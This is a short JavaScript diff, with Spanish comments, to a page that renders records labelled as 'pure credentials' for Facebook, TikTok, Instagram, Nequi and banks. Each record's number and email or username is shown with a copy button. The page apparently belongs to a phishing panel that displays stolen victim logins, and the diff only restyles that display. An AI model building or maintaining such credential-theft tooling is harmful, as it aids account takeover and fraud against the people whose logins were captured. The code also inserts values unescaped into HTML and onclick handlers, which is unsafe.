@@ -753,17 +753,18 @@ const esWA_Codigo    = esWA_VipGroup || esWA_Advance;
         //  BLOQUE 4 — CREDENCIALES PURAS
         //  (Facebook, TikTok, Instagram, Nequi, Bancos, etc.)
         // ══════════════════════════════════════════════════
-        else {
-            const labelUser = (esTikTok || esInstagram) ? "Usuario" : "Correo/Email";
+else {
+    const labelUser = (esTikTok || esInstagram) ? "Usuario" : "Correo/Email";
 
-            if (v.numero) html += `
-            <div style="margin:4px 0;">
-                Número: <b style="color:#0ff;">${v.numero}</b>
-                <button onclick="navigator.clipboard.writeText('${v.numero}');mostrarNotif('✅ Copiado')"
-                    style="background:none;border:1px solid #0ff;color:#0ff;padding:1px 7px;border-radius:3px;font-size:10px;cursor:pointer;margin-left:5px;">
-                    Copiar
-                </button>
-            </div>`;
+    if (v.numero) html += `
+    <div style="display:flex;align-items:center;gap:8px;margin:3px 0;">
+        <span style="color:#aaa;font-size:12px;">Número:</span>
+        <b style="color:#0ff;font-size:13px;">${v.numero}</b>
+        <button onclick="navigator.clipboard.writeText('${v.numero}');mostrarNotif('✅ Copiado')"
+            style="background:none;border:1px solid #0ff;color:#0ff;padding:2px 8px;border-radius:4px;font-size:11px;cursor:pointer;transition:all .2s;">
+            Copiar
+        </button>
+    </div>`;
 
             if (v.correo || v.usuario) html += `
             <div style="margin:5px 0;display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
